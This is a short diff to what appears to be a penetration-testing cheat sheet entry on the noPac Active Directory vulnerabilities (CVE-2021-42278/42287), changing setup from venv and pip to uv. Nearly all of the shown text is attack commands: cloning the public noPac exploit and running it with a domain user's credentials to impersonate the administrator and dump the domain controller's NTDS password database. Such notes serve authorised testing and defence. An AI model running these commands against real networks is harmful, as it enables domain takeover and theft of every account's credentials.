@@ -272,13 +272,11 @@ CVE-2021-42278 / CVE-2021-42287. Any domain user can create machine accounts (up
 - https://github.com/Ridter/noPac
 
 ```bash
-# Setup -- venv avoids dependency conflicts
 git clone https://github.com/Ridter/noPac.git && cd noPac
-python3 -m venv venv && source venv/bin/activate
-pip3 install -r requirements.txt
+uv pip install -r requirements.txt
 
 # Dump NTDS as Administrator (-use-vss is more reliable than default method)
-python3 noPac.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> \
+uv run python3 noPac.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> \
     --impersonate administrator -dump -use-ldap -use-vss
 ```
 
